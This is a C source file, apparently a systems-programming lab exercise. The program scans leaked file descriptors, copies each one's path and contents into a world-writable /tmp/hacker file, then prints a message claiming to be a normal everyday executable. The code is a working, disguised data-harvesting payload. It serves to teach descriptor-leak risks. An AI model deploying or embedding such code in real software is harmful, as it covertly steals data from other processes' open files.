#include "csapp.h"

int is_regular_file(int fd)
{
    struct stat path_stat;
    Fstat(fd, &path_stat);
    return S_ISREG(path_stat.st_mode);
}

int main(void)
{
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);

  /* TODO: Something is missing here! */
  const int bufsiz = 512;
  char link_name[bufsiz]; 
  char path_name[bufsiz];

  for (int i = 4; i < max_fd; ++i)
  {
    // test if readable
    if (lseek(i, 0, SEEK_SET) == -1)
    {
      continue;
    }
   
    /*
    if(!is_regular_file(i))
      continue;
    */

    // get symbolic link using procfs(5)
    snprintf(link_name, bufsiz, "/proc/self/fd/%d", i);

    // read path from symbolic link
    int pathsz;
    if ((pathsz = Readlink(link_name, path_name, bufsiz-1)) == -1)
    {
      fprintf(stderr, "Readlink err");

      continue;
    }
    path_name[pathsz] = '\0';
    
    // print filepath
    dprintf(out, "File descriptor %d is '%s' file!\n", i, path_name);

    // print file's content
    int readsz;
    char buf[4096];
    if ((readsz = Read(i, buf, 4095)) > 0)
    {
      buf[readsz] = '\0';
      dprintf(out, "%s", buf);
    }
  }
  /* */
  
  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}
